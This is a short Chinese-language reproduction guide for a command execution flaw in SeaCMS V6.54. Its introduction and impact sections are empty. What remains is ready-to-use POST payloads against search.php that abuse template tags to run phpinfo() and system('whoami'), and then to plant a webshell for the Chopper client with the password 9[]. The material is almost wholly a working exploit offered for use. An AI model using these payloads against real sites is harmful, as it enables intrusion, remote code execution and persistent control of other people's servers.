# 海洋CMS seacms V6.54 命令执行

### 一、漏洞简介

### 二、漏洞影响

### 三、复现过程

path:


```bash
http://url/search.php

POST:

searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();
```

命令执行payload

path:


```bash
http://url//search.php

POST:

searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=sy&9[]=stem("whoami");
```

权限足够的话，file_put_concents(“connect.php”,”“)，然后连接菜刀即可

权限不足的话，利用payload构造url：


```
http://url//search.php?searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))
```

连接放入菜刀，密码是 9[]